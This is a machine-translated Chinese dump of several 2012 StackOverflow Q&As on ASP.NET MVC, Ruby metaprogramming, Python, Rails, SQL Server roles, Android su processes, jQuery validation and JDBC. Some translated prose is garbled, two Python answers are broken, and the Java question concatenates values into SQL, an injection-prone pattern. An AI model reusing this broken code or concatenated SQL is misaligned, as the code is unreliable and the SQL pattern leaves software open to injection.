> ID：13806629
> 
> 赞同：1
> 
> 时间：2012-12-10T18:08:45.683
> 
> 标签：c#, asp.net-mvc, razor, type-conversion, covariance

我有一个大问题，我有点失望。我找不到解决这个问题的好方法：

我有谁专门谁在我`CompanyA`的 控制器中有一个接口。然后我从不同的数据库加载，并在我的. 在我的中，我显示不同的对象和.`CompanyB``Company``ICompany``companyA``companyB``List<company>``EditorView``companyA``companyB`

当我保存时，在我的控制器中，我列表中的对象不是要键入`CompanyA`and `CompanyB`，但它们都是 type `Company`。

保存时如何保留我的类型？

如果我的解释不清楚，这里是一些代码：

我的示例 CompanyViewModel.cs：

```
public class CompanyViewModel
{
    #region Properties
    public User User { get; set; }
    public ExternalAccounts ExtAccounts { get; set; }
    public List<Company> Companies { get; set; } // or List<object> Companies { get; set; }
    ....
    #region Ctor
    public CompanyViewModel()
    { }
    public CompanyViewModel(ExternalAccounts extAccount, bool iniPrefLanguage = true)
    {
        //normaly it's load from bdd 
        ...
        Companies = new List<Company>();

        if (test == true)
        {
            Companies.Add(new CompanyA()); // call webService
        }
        if (test2 == true)
        {
            Companies.Add(new CompanyB());

        }
        ...
        #region
} 
```

或者我可以拥有：

```
 public ActionResult EditCompanies()
    {
        ...

        // Companies = new List<Company>();
         Model.Companies.Add(new CompanyA()); // call webService
         Model.Companies.Add(new CompanyB());                

        return View(Model);
    }

    public ActionResult SaveCompanies(ComapnyViewModel model)
    {
        var test = model.Companies.OfType<CompanyA>(); // return null !!!
        test = model.Companies.OfType<CompanyB>(); // return null !!!!
        test = model.Companies.OfType<Company>(); // return my objects !!!!

        return View();
    } 
```

在视野中

```
 @Html.EditorFor(m => m.Companies) 
```

我有带有 Company.cshtml、CompanyA.cshtml、CompanyB.cshtml 的 EditorTemplate

在 View 中加载期间，列表中的每个对象都转到正确的 EditorTemplate（CompanyA 和 CompanyB）

但是当我保存时......我只有一个公司类型的列表......

有任何想法吗？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T23:18:25.363

我所做的是：

我创建了一个以 Company 作为模型的视图，一个以 CompanyA 作为模型的局部视图，以及另一个以 CompanyB 作为模型的视图。在 CompanyView 中，我调用了`Html.Partial("CompanyAView", Model)`和`Html.Partial("CompanyBView", Model)`。

我希望这有帮助。

# ruby - 将 super 与 class_eval 一起使用

> ID：13806630
> 
> 赞同：3
> 
> 时间：2012-12-10T18:08:49.163
> 
> 标签：ruby, metaprogramming

我有一个应用程序，其中包含模块到核心类中，用于添加客户端自定义。

我发现 class_eval 是覆盖核心类中方法的好方法，但有时我想避免重写整个方法，而只是遵循原始方法。

例如，如果我有一个名为 的方法`account_balance`，最好在我的模块（即包含在类中的模块）中执行类似的操作：

```
module CustomClient
  def self.included base
    base.class_eval do
      def account_balance
        send_alert_email if balance < min
        super # Then this would just defer the rest of the logic defined in the original class
      end
    end
  end
end 
```

但是使用 class_eval 似乎将该`super`方法从查找路径中取出。

有谁知道如何解决这个问题？

谢谢！

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-12-10T18:18:15.357

我认为有几种方法可以做你想做的事。一种是打开类并为旧实现起别名：

```
class MyClass
  def method1
    1
  end
end

class MyClass
  alias_method :old_method1, :method1
  def method1
    old_method1 + 1
  end
end

MyClass.new.method1
 => 2 
```

这是[猴子修补](http://en.wikipedia.org/wiki/Monkey_patch)的一种形式，因此最好适度使用该成语。此外，有时需要一个单独的辅助方法来保存通用功能。

**编辑**：有关更全面的选项集，请参阅 Jörg W Mittag 的答案。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-12-10T19:30:41.190

> 我发现 instance_eval 是覆盖核心类中方法的好方法，

你没有压倒一切。你正在*覆盖*又名猴子补丁。

> 但有时我想避免重写整个方法，而只是遵循原始方法。

你不能遵循原来的方法。没有原始方法。你覆盖了它。

> 但是使用 instance_eval 似乎将该`super`方法从查找路径中取出。

您的示例中没有继承。`super`甚至没有发挥作用。

请参阅此答案以获取可能的解决方案和替代方案：[猴子修补方法时，您可以从新实现中调用覆盖的方法吗？](https://stackoverflow.com/questions/4470108/when-monkey-patching-a-method-can-you-call-the-overridden-method-from-the-new-i/4471202#4471202)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-11T12:18:25.490

正如你所说， alias_method 必须小心使用。鉴于这个人为的例子：

```
module CustomClient
...    
    host.class_eval do
      alias :old_account_balance :account_balance
      def account_balance ...
        old_account_balance
      end
...
class CoreClass
    def old_account_balance ... defined here or in a superclass or
                                in another included module
    def account_balance
        # some new stuff ...
        old_account_balance # some old stuff ...
    end
    include CustomClient
end 
```

你最终会出现一个无限循环，因为在别名之后，old_account_balance 是 account_balance 的副本，它现在调用自己：

```
$ ruby -w t4.rb 
t4.rb:21: warning: method redefined; discarding old old_account_balance
t4.rb:2: warning: previous definition of old_account_balance was here
[ output of puts removed ]
t4.rb:6: stack level too deep (SystemStackError) 
```

[来自 Pickaxe] 这种技术 [alias_method] 的问题在于，您依赖的不是名为 old_xxx 的现有方法。一个更好的选择是使用实际上是匿名的方法对象。

话虽如此，如果您拥有源代码，一个简单的别名就足够了。但对于更一般的情况，我将使用 Jörg 的方法包装技术。

```
class CoreClass
    def account_balance
        puts 'CoreClass#account_balance, stuff deferred to the original method.'
    end
end

module CustomClient
  def self.included host
    @is_defined_account_balance = host.new.respond_to? :account_balance
    puts "is_defined_account_balance=#{@is_defined_account_balance}"
        # pass this flag from CustomClient to host :
    host.instance_variable_set(:@is_defined_account_balance,
                                @is_defined_account_balance)
    host.class_eval do
      old_account_balance = instance_method(:account_balance) if
                @is_defined_account_balance
      define_method(:account_balance) do |*args|
        puts 'CustomClient#account_balance, additional stuff'
            # like super :
        old_account_balance.bind(self).call(*args) if
                self.class.instance_variable_get(:@is_defined_account_balance)
      end
    end
  end
end

class CoreClass
    include CustomClient
end

print 'CoreClass.new.account_balance : '
CoreClass.new.account_balance 
```

输出 ：

```
$ ruby -w t5.rb 
is_defined_account_balance=true
CoreClass.new.account_balance : CustomClient#account_balance, additional stuff
CoreClass#account_balance, stuff deferred to the original method. 
```

为什么不是类变量 @@is_defined_account_balance ？[来自 Pickaxe] 包含 include 的模块或类定义可以访问它所包含的模块的常量、类变量和实例方法。
它将避免将其从 CustomClient 传递到主机并简化测试：

```
 old_account_balance if @@is_defined_account_balance # = super 
```

但是有些人不喜欢类变量和全局变量一样。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-10T21:39:05.760

[来自 Pickaxe] 方法 Object#instance_eval 允许您将 self 设置为任意对象，评估块中的代码，然后重置 self。

```
module CustomClient
  def self.included base
    base.instance_eval do
      puts "about to def account_balance in #{self}"
      def account_balance
        super
      end
    end
  end
end

class Client
    include CustomClient #=> about to def account_balance in Client
end 
```

如您所见，`def account_balance`在包含模块的主机类 Client 的上下文中进行评估，因此 account_balance 成为 Client 的单例方法（又名类方法）：

```
print 'Client.singleton_methods : '
p Client.singleton_methods #=> Client.singleton_methods : [:account_balance] 
```

Client.new.account_balance 不起作用，因为它不是实例方法。

> “我有一个将模块包含到核心类中的应用程序”

由于您没有提供太多细节，因此我设想了以下基础架构：

```
class SuperClient
    def account_balance
        puts 'SuperClient#account_balance'
    end
end

class Client < SuperClient
    include CustomClient
end 
```

现在用 class_eval 替换 instance_eval。[来自 Pickaxe] class_eval 将事情设置为就像您在类定义的主体中一样，因此方法定义将定义实例方法。

```
module CustomClient
...
   base.class_eval do
...

print 'Client.new.account_balance : '
Client.new.account_balance 
```

输出 ：

```
 #=> from include CustomClient :
about to def account_balance in Client #=> as class Client, in the body of Client
Client.singleton_methods : []
Client.new.account_balance : SuperClient#account_balance #=> from super 
```

```
"But using instance_eval seems to take the super method out of the lookup path." 
```

`super`已经奏效了。问题是instance_eval。

# python - 在 Python 中将句子转换为字典

> ID：13806633
> 
> 赞同：4
> 
> 时间：2012-12-10T18:08:56.433
> 
> 标签：python, string, dictionary, add

我有以下字符串：

```
>>>sentence='No, I shouldn't be glad, YOU should be glad.' 
```

我想要的是制作一个字典，以句子中的一个单词为键，下一个单词为值。

```
>>>dict(sentence)
{('No,'): ['I'], ('I'): ['shouldn't'], ('shouldn't'): ['be'], ('be'): ['glad,', 'glad.'], ('glad,'): ['YOU'], ('YOU'): ['should'], ('should'): ['be']} 
                                                                 ^        ^       ^             
                                                                 |        |       | 
```

如您所见，如果一个单词在一个句子中出现多次，它会得到多个值。如果它是最后一个单词，它将不会被添加到字典中。'glad' 不会获得多个值，因为单词以 ',' 或 '.' 结尾 这使它成为一个不同的字符串。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-10T18:11:58.293

```
import collections

sentence = "No, I shouldn't be glad, YOU should be glad."

d = collections.defaultdict(list)
words = sentence.split()
for k, v in zip(words[:-1], words[1:]):
   d[k].append(v)
print(d) 
```

这产生

```
defaultdict(<type 'list'>, {'No,': ['I'], 'be': ['glad,', 'glad.'], 'glad,': ['YOU'], 'I': ["shouldn't"], 'should': ['be'], "shouldn't": ['be'], 'YOU': ['should']}) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-10T18:15:58.473

使用[`dict.setdefault()`](https://docs.python.org/2/library/stdtypes.html#dict.setdefault)：

```
In [9]: strs = "No, I shouldn't be glad, YOU should be glad."

In [19]: dic = {}

In [20]: for x, y in zip(words, words[1:]):
      dic.setdefault(x, []).append(y)     
   ....:     

In [21]: dic
Out[21]: 
{'I': ["shouldn't"],
 'No,': ['I'],
 'YOU': ['should'],
 'be': ['glad,', 'glad.'],
 'glad,': ['YOU'],
 'should': ['be'],
 "shouldn't": ['be']} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-10T18:14:13.213

这未经测试，但应该接近。

```
words = sentence.split()
sentenceDict = {}
for index in xrange(len(words)-1):
    if words[index] in sentenceDict:
        sentenceDict[words[index].append(words[index+1])
    else
        sentenceDict[words[index]] = [words[index+1]] 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-10T18:31:33.007

如果顺序不重要，只是另一种方法

```
sentence="No, I shouldn't be glad, YOU should be glad."
#Split the string into words
sentence = sentence.split()
#Create pairs of consecutive words
sentence = zip(sentence,sentence[1:])
from itertools import groupby
from operator import itemgetter
#group the sorted pairs based on the key
sentence = groupby(sorted(sentence, key = itemgetter(0)), key = itemgetter(0))
#finally create a dictionary of the groups
{k:[v for _,v in  g] for k, g in sentence}
{'No,': ['I'], 'be': ['glad,', 'glad.'], 'glad,': ['YOU'], 'I': ["shouldn't"], 'should': ['be'], "shouldn't": ['be'], 'YOU': ['should']} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-10T18:37:23.613

```
import collections

sentence = "No, I shouldn't be glad, YOU should be glad."

d = collections.defaultdict(list)
words = sentence.split()
for k, v in zip(words[:-1], words[1:]):
   d[k].append(v)
print(d) 
```

这产生

```
defaultdict(<type 'list'>, {'No,': ['I'], 'be': ['glad,', 'glad.'], 'glad,': ['YOU'], 'I': ["shouldn't"], 'should': ['be'], "shouldn't": ['be'], 'YOU': ['should']}) 
```

@NLS：我只是想在此添加一些内容。“d = collections.defaultdict(list)”，就像 dict 对象不保留单词的顺序，所以如果我们必须保留句子的顺序，我们可能必须使用元组。

# delphi - Delphi XE2 的 gnugettext 基本目录

> ID：13806635
> 
> 赞同：0
> 
> 时间：2012-12-10T18:09:14.640
> 
> 标签：delphi, gettext

我正在评估 Delphi XE2 的 gnugettext。一切似乎都还好，只是我们似乎没有翻译目录选择：它总是“\locale\Lc_MESSAGES\”。因为我需要在同一个应用程序中共享一些 exe 的翻译，所以不是很方便。我查看了来源并看到：

```
BaseDirectory:=ExtractFilePath(ExecutableFilename); 
```

好的，我可能会更改来源，但我不喜欢它。任何优雅的想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-30T17:30:38.090

您可以使用提供的**bindtextdomain**函数来更改应用程序查找字典文件的目录。第一个参数通常是字符串'default'，第二个参数是要转到的目录。实际的字典文件仍需要位于指定目录的子文件夹中（使用相同的 \locale\LC_MESSAGES\ 模式），但这至少提供了一种在多个程序之间共享翻译的便捷方式。

# ruby-on-rails - N+1 在与活动记录的关系中？

> ID：13806639
> 
> 赞同：0
> 
> 时间：2012-12-10T18:09:41.583
> 
> 标签：ruby-on-rails, activerecord, select-n-plus-1

我有四个模型

1.  团体
2.  报告
3.  评论
4.  用户

组 => has_many => 报告

报告 => has_many => 评论

评论 => Belongs_to => 用户

当我想展示一个小组时，我会做类似的事情

```
 <%= @group.name %>
 <%= @group.reports.includes(:comments).each do |report| %>
      <%= report.name %>
      <% report.comments.each do |comment| %>
           <%= comment.name %>
           <%= comment.user.name %>
      <% end %>
 <% end %> 
```

在这种情况下解决 N+1 查询问题的最佳方法是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-10T18:58:48.450

也许

```
@group.reports.includes(:comments => :user).each do |report| 
```

# sql-server - 如何将 Windows 用户添加到 SQL Server 2012 中的 sysadmin 服务器角色？

> ID：13806649
> 
> 赞同：7
> 
> 时间：2012-12-10T18:10:20.307
> 
> 标签：sql-server

我有一个在 Windows 用户上下文中执行的 Powershell 脚本。此用户登录 SQL 2012 实例，该实例是 sysadmin 服务器角色的成员。

我希望脚本将 SQL 实例（也有相应的 Windows 用户）上的另一个登录名添加到 sysadmin 服务器角色。

要在 Management Studio（作为 SA 连接）中尝试此操作，我使用以下脚本：

```
execute as user = 'domain\currentsysadmin'

IF IS_SRVROLEMEMBER('sysadmin', 'domain\futuresysadmin') != 1
    ALTER SERVER ROLE [sysadmin] ADD MEMBER [domain\futuresysadmin]

revert 
```

我这里有两个问题：

1.  当我运行此处显示的脚本时，对 IS_SRVROLEMEMBER 的调用按预期返回 0，但即使 domain\currentsysadmin 登录是 sysadmin 的成员，对 ALTER SERVER ROLE 的调用也会返回：

    消息 15151，级别 16，状态 1，第 8 行无法更改服务器角色“sysadmin”，因为它不存在或您没有权限。

2.  当我在没有 EXECUTE AS 语句的 SA 上下文中运行它时，ALTER SERVER ROLE 语句似乎运行成功，但是当我检查 domain\futuresysadmin 登录时，它仍然不是 sysadmin 角色的成员

如何将域\futuresystem 登录添加到 sysadmin 服务器角色？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-10T22:52:15.050

使用`sp_addsrvrolemember`：

```
EXEC master..sp_addsrvrolemember @loginame = N'domain\futuresysadmin', @rolename = N'sysadmin' 
```

更新：用户上下文切换不继承任何服务器角色，如系统管理员。在阅读文档时：“不尊重在用户令牌中或通过角色成员资格明确授予身份的服务器级权限。” 当您切换用户上下文时，您的用户不再有权将 sysadmin 授予另一个用户。

# java - Runtime.getRuntime 执行

> ID：13806654
> 
> 赞同：1
> 
> 时间：2012-12-10T18:10:46.550
> 
> 标签：java, android

我创建了一个类来处理 android 应用程序中的 root 命令，它大部分工作得很好。我使用 Runtime.getRuntime().exec("su") 创建进程，然后使用 DataOutputStream 输入命令，并使用 DataInputStream 和已弃用的 readLine 从命令中获取数据。（我已经尝试使用 BufferedReader 代替，但问题没有区别）。

我的问题是，如果命令产生错误，应用程序将挂起。F.eks。如果我执行命令 "[ -f /test ] && md5sum /test" || echo 0" 我不会有任何问题。但是，如果我执行 "md5sum /test" 并且文件不存在，我将不得不强制关闭应用程序，因为它将无处可去。在这个例子中，解决方案是有原因的像在第一个示例中那样检查文件，但并非所有情况都如此简单。问题可能发生，当它们发生时，人们不应该强制关闭应用程序。

有没有办法解决这个问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-10T19:15:36.447

您的应用程序可能挂起，因为您可能没有处理生成的进程生成的 stderr/stdout。这背后的原因是衍生进程的输出缓冲区非常小（通常只有几千字节）。一旦这些缓冲区已满，该进程将挂起，直到其缓冲区释放足够的空间以继续写入输出文本。我怀疑您在运行第二个命令时遇到问题，因为第二个命令失败并生成大量控制台输出。您的子进程用完缓冲区空间，然后尝试阻塞，直到有更多空间可用，这永远不会发生。

`Runtime.getRuntime().exec()`返回 的实例`Process`。 `Process`对象有一个访问器方法（我相信它是`getInputStream()`），允许您使用它的标准输出。您还需要对`getErrorStream()`. 通常，我得到`InputStream`，然后有一个单独的线程不断地使用其中的数据，`InputStream`直到它关闭。您不需要对数据本身做任何事情，只需阅读它即可。这将告诉底层进程它可以清除其输出缓冲区，希望在它们变满之前（因此，导致进程阻塞）。

另外，我不是 100% 熟悉 Android，但在普通的 java 中，最好使用`ProcessBuilder`生成子`Process`实例。这是因为`ProcessBuilder`可以让您将孩子的 stderr 和 stdout 组合在同一个流中，这样您就可以通过从`process.getInputStream()`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T08:32:05.410

好的，我查看了 ProcessBuilder （也适用于 android）。但我仍然遇到问题。

```
while ((line = buffer.readLine()) != null) {
    data = line;
}

if (data != null && data.contains("uid=0")) {
    return true;
} 
```

这将提供与以前相同的问题。它无处可去。但是，如果我将代码更改为

```
while ((line = buffer.readLine()) != null) {
    if (data != null && data.contains("uid=0")) {
        return true;
    }
} 
```

这将正常工作。该过程将结束，它将返回true。问题是，为了让我使用它，我必须确切地知道返回数据的期望值（我在这个测试方法中这样做）。所以这不可能是解决方案。

这是整个测试方法

```
try {
    ProcessBuilder builder = new ProcessBuilder("su");
    builder.redirectErrorStream(true);

    Process process = builder.start();
    DataOutputStream output = new DataOutputStream(process.getOutputStream());
    InputStreamReader reader = new InputStreamReader(process.getInputStream());
    BufferedReader buffer = new BufferedReader(reader);

    output.writeBytes("id\n");
    output.flush();

    String line = null;
    String data = null;
    while ((line = buffer.readLine()) != null) {
        data = line;
    }

    if (data != null && data.contains("uid=0")) {
        return true;
    }

} catch(Throwable e) {
    Log.d(TAG, "Root access rejected [" + e.getClass().getName() + "] : " + e.getMessage());
}

return false; 
```

# jquery - foreach 循环中的 ASP.NET MVC2 验证

> ID：13806659
> 
> 赞同：0
> 
> 时间：2012-12-10T18:11:16.733
> 
> 标签：jquery, validation, asp.net-mvc-2

我（终于）深入研究了 JQuery，想知道如何在发布**之前正确处理文本输入的验证。**我有一个 ASPX 页面，它将遍历我的模型的一部分，为每个循环调用一个用户控件。我还有一个 JQuery Add 链接，它将向集合中添加一个新的（空白）用户控件。

该页面如下所示：

```
 <h1>Create Document List</h1>

    <% Html.EnableClientValidation(); %>

    <% using (Html.BeginForm("CreateList", "Documents", FormMethod.Post, new { @class = "list", @enctype = "multipart/form-data" })) 
    { %>
        <%= Html.AntiForgeryToken() %>

        <div id="editorRows">
            <% foreach(var q in ViewData.Model.DocumentAndFileList)
                   Html.RenderPartial("DocEditRow", q);
            %>
        </div>
        <br />

        <%= Html.ActionLink("Add another...", "Add", null, new { id = "addItem" }) %>

        <br />
        <br />
        <br />

        <%= Html.SubmitButton("btnSave", "Save Document List")%>
        <%= Html.Button("btnCancel", "Cancel", HtmlButtonType.Button, "window.location.href = '" + Html.BuildUrlFromExpressionForAreas<DocumentsController>(c => c.Index()) + "';") %>
    <% } %>
</asp:Content> 
```

用户控件如下所示：

```
<div class="editorRow">
    <% using (Html.BeginCollectionItem("docs"))
       { %>

        <%= Html.Hidden("Document.Id", (Model != null) ? Model.Id : 0)%>

        <label for="Number">Document Name:</label>
        <%= Html.TextBox("Number", (Model != null) ? Model.Number : "", new { @size = "50", @maxlength = "255" })%>
        <%= Html.ValidationMessageFor(m => m.Number) %>

        &nbsp;

        <% if (Model != null && Model.FileName != null && Model.FileName.Length > 0)
           { %>
            <label>Current File:</label>
            <%= Model.FileName%>
        <% }
           else
           { %>
            <label>
                File Upload:
                <%= Html.FileBoxFor(m => m.HttpPostedFileBase)%>
            </label>
        <% } %>
        <a href="#" class="deleteRow">delete</a>
    <% } %>
</div> 
```

我听从了 Scott Gu 在[他博客](http://weblogs.asp.net/scottgu/archive/2010/01/15/asp-net-mvc-2-model-validation.aspx)上的一篇旧帖子上的建议。出于某种原因，我**没有**得到任何验证。这个项目的以前的开发人员使用了很多 JQuery，所以我现在正试图让 JQuery 验证工作，但真的不知道从哪里开始。谷歌搜索似乎给我带来了大约 500 种不同的方法来做到这一点。任何指针将不胜感激。

TIA

* * *

**笔记：**

我在我的页面中添加了以下内容：

```
<asp:Content ID="myScript" ContentPlaceHolderID="pageScript" runat="server">
    <script type="text/javascript" language="javascript">
        $(document).ready(function () {
            $("#LoadDocs").validate();
            $.validator.unobtrusive.parse("#LoadDocs");
        });
    </script>
</asp:Content> 
```

这似乎部分有效。如果我向我的集合添加几行新行，如果文本框为空，则只有第一行会弹出消息。我还添加了一个

> 类=“必需”

我所有的输入。

不过，我仍在努力让它 100% 工作。有什么建议么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-02T17:07:16.533

我从来没有想出使用内置验证器的方法。我最终做的是：

```
<asp:Content ID="myScript" ContentPlaceHolderID="pageScript" runat="server">
    <script type="text/javascript" language="javascript">
        $().ready(function () {
            $("#addItem").click(function () {
                //alert('hi');

                $.ajax({
                    url: this.href,
                    cache: false,
                    success: function (html) { $("#editorRows").append(html); }
                });
                return false;
            });

            $("a.deleteRow").live("click", function () {
                $(this).parents("div.editorRow:first").remove();
                return false;
            });
        });

        function OnDocUpload() {
            var editorRows = $('.editorRow');
            //alert(editorRows.length);
            var isGood = true;
            editorRows.each(function () {
                var input = $(this).children('.required.input').first();
                var msg = $(this).children('.display_message').first();
                //alert(input.val().length + " | " + msg.html);
                if (input.val().length < 1) {
                    isGood = false;
                    input.css('background-color', '#FEADCE');
                    msg.text("A document name is required!");
                } else {
                    input.css('background-color', '#FAFAD2');
                    msg.text("");
                }
            });
            return isGood;
        }

        function SubmitForm() {
            if (OnDocUpload()) {
                var frm = $("#LoadDocs");
                frm.submit();
                //$("#LoadDocs").submit();
            }
        }
    </script>
</asp:Content>

<asp:Content ID="Content1" ContentPlaceHolderID="MainContentPlaceHolder" runat="server">

    <h1>Create Document List</h1>

    <% 
    Html.EnableClientValidation();
    using (Html.BeginForm("CreateList", "CIPDocuments", FormMethod.Post, new { @class = "wufoo", @enctype = "multipart/form-data", @id = "LoadDocs" })) 
    { %>
        <%= Html.AntiForgeryToken() %>

        <div id="editorRows">
            <% foreach(var cipDocument in ViewData.Model.CIPDocumentAndFileList)
                   Html.RenderPartial("DocEditRow", cipDocument);
            %>
        </div>
        <br />

        <%= Html.ActionLink("Add another...", "Add", null, new { id = "addItem" }) %>

        <br />
        <br />
        <br />

        <%= Html.Button("btnSave", "Save Document List", HtmlButtonType.Button, "SubmitForm();")%>
        <%= Html.Button("btnCancel", "Cancel", HtmlButtonType.Button, "window.location.href = '" + Html.BuildUrlFromExpressionForAreas<CIPDocumentsController>(c => c.Index()) + "';") %>
    <% } %>
</asp:Content> 
```

# c# - new() 约束对类定义有什么作用？

> ID：13806660
> 
> 赞同：4
> 
> 时间：2012-12-10T18:11:17.047
> 
> 标签：c#, oop, class, inheritance, polymorphism

我看到了这个代码示例，想知道`new()`约束的目的是什么：

```
public class Client<T> : IClient where T : IClientFactory, new()
{
    public Client(int UserID){ }
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-10T18:14:13.527

这被称为“'新'约束”。 [这是](http://msdn.microsoft.com/en-us/library/sd2w2ew5%28v=vs.110%29.aspx)关于它的文档。

> 新约束指定泛型类声明中的任何类型参数都必须具有**公共无参数构造函数**。要使用新的约束，类型不能是抽象的。

（强调我的）

基本上，每当你`T`在类中的某个地方创建一个新的地方时，你都需要它，以确保你只能传递编译器*可以*创建一个新实例的东西。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-10T18:14:21.827

`Client`是`T`对象的集合，这些`T`对象必须实现`IClientFactory`接口并具有公共无参数构造函数。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-10T18:15:20.143

new() 表示

> 类型参数必须有一个公共的无参数构造函数。当与其他约束一起使用时，必须最后指定 new() 约束。

参考[MSDN 上的通用约束](http://msdn.microsoft.com/en-us/library/d5x73970.aspx)

# c#-4.0 - 直接在 C# 中使用接口

> ID：13806661
> 
> 赞同：0
> 
> 时间：2012-12-10T18:11:20.390
> 
> 标签：c#-4.0, interface

我最近在“Professional C# 4 and .NET 4”中读到：

> 你永远不能实例化一个接口。

但我会定期看到这样的事情：

```
IQuadrilateral myQuad; 
```

直接使用接口有什么限制（没有从接口继承的类）？我怎么能使用这样的对象（如果它们甚至可以被称为对象）？

例如，不使用派生自 IQuadrilateral 的 Square 类，我可以在多大程度上摆脱创建像 IQuadrilateral myQuad 这样的接口？

由于接口不实现方法，我认为我不能对它们使用任何方法。我认为接口没有字段（只有属性），所以我不确定如何使用它们存储数据。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-10T18:16:49.567

答案很简单，你不能实例化一个接口。

您提供的示例不是实例化接口的示例，您只是定义类型的局部变量`IQuadrilateral`

要实例化接口，您必须这样做：

```
IQuadrilateral myQuad = new IQuadrilateral(); 
```

这是不可能的，因为`IQuadrilateral`没有构造函数。

这是完全有效的：

```
IQuadrilateral myQuad = new Square(); 
```

但是您不是在启动`IQuadrilateral`，而是在启动`Square`并将其分配给类型为 的变量`IQuadrilateral`。

中可用`myQuad`的方法将是接口中定义的方法，但实现将基于`Square`. 除非您强制转换为变量，否则`Square`不属于接口的任何其他方法都`IQuadrilateral`将不可用。`myQuad``Square`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-10T18:13:53.040

您不能创建接口的实例。

您显示的代码定义了一个类型为 的变量`IQuadrilateral`。此变量指向的实际实例将始终是实现此接口的具体类。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-10T18:42:36.643

## 背景知识

将接口视为合同。在两个人之间的合同中，它定义了所涉及的各方的能力和期望。在编程中，它的工作方式相同。接口定义了期望什么，**必须**存在什么才能符合该接口。因此，由于它只定义了预期的内容，它本身并没有提供实现，可以说是“幕后代码”。

属性的行为类似于字段，但允许您在有人为其分配值或读取值时进行拦截。您也可以拒绝读取或写入它，这是您定义属性时的选择。因此，接口使用属性而不是字段。由于“合同”只是定义应该存在的属性（名称和类型），并且如果它应该允许读取或写入功能，则由实现者来提供它。

以.NET 框架中的[IEnumerator接口为例。](http://msdn.microsoft.com/en-us/library/system.collections.ienumerator.aspx "IEnumerator")该接口旨在允许对对象集合进行迭代。目的不是更改项目或随机访问它们，它只是为了获取对象 A 并根据需要多次移动到下一个、下一个、下一个。许多集合类型类实现了这一点：Queue、ArrayList、SortedList、Stack 等。所有这些类型的对象都存储了许多对象，现在它们都共享一个共同的“契约”：能够逐个迭代它们。

但是，您可以看到该`IEnumerator`接口`MoveNext()`声明了一个方法。为什么？这是因为这些项目可能不会以相同的方式提供。例如，人们通常会从第一项到最后一项访问 ArrayList。但是 a`Stack`的设计正好相反，人们可以访问最后一个对象到第一个对象。

## 已回答的问题

有了所有这些知识，将变量声明为接口类型而不是实现接口的类类型的局限性在于，您只能访问接口（合同）所说的应该存在的内容。但好处是您可以将任何实现该接口的类类型分配给此变量。

# objective-c - 重用来自服务器的 api 响应以供以后使用

> ID：13806663
> 
> 赞同：-3
> 
> 时间：2012-12-10T18:11:29.763
> 
> 标签：objective-c, ios

我有一个 twitter 帐户用户列表。当用户单击任何特定用户时，我调用 twitter api 从服务器收集所有推文并将其存储在 NSArray 中。假设我有 1000 条推文，我不想一次又一次地调用那个 api 那么有没有最好的方法来存储这些推文，所以下次当同一个用户点击时，这些推文会直接显示而无需 api 调用。我想要不使用数据库的解决方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T18:17:39.793

如果您只需要数据的启动会话生命周期（即关闭应用程序 - 数据丢失）并且不想使用数据库（不知道为什么，使用 Core Data 确实更容易，即使使用内存存储 - 快速方便) 你可以创建一个单例类来存储列表。这可能是一个带有键的字典 - user_id, values - 带有推文的数组。

```
user_id -> [tweet1, tweet2] 
```

你向它询问用户 ID 的推文，它返回数组或 nil。

我建议您使用核心数据。使用 Core Data，您可以轻松切换到文件存储（SQLite 或文件）或内存存储。它处理引擎盖下的所有东西。但无论如何 - 这取决于你。

# java - 为什么我的更新结果集不起作用

> ID：13806681
> 
> 赞同：-1
> 
> 时间：2012-12-10T18:12:26.267
> 
> 标签：java, database-connection, sql-update, resultset

我得到了不起作用的更新 sql，我似乎无法使其工作。我不知道哪里出了问题，我得到了 Nullpointer 异常。

这是我的 KaldSQL 课程

```
public ResultSet opdatereOrdre(Connection con, int BestillingsID, int Modtager){

    ResultSet opdatereOrdre = null;

    try {
        PreparedStatement stmt = con.prepareStatement("UPDATE varebestillinger set BestillingsStatus=1, ModtagetAf ="+Modtager+" where BestillingsID="+BestillingsID);
        opdatereOrdre = stmt.executeQuery();

    } catch (SQLException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }
    return opdatereOrdre;
} 
```

这是我的 HentbestillingsordreHandler

```
public void actionPerformed(ActionEvent e) {
                        System.out.println(hentordregistrer.BestillingsID);
                        try {

                            con = ks.connectNow();
                            ResultSet rs = ks.opdatereOrdre(con, hentordregistrer.BestillingsID, 1);

                        } catch (ClassNotFoundException e1) {
                            // TODO Auto-generated catch block
                            e1.printStackTrace();
                        } catch (SQLException e1) {
                            // TODO Auto-generated catch block
                            e1.printStackTrace();
                        }

                    }
                }); 
```

我得到的错误是

```
java.sql.SQLException: Can not issue data manipulation statements with executeQuery().
    at com.mysql.jdbc.SQLError.createSQLException(SQLError.java:1055)
    at com.mysql.jdbc.SQLError.createSQLException(SQLError.java:956)
    at com.mysql.jdbc.SQLError.createSQLException(SQLError.java:926)
    at com.mysql.jdbc.StatementImpl.checkForDml(StatementImpl.java:412)
    at com.mysql.jdbc.PreparedStatement.executeQuery(PreparedStatement.java:1794)
    at KaldSQL.opdatereOrdre(KaldSQL.java:126)
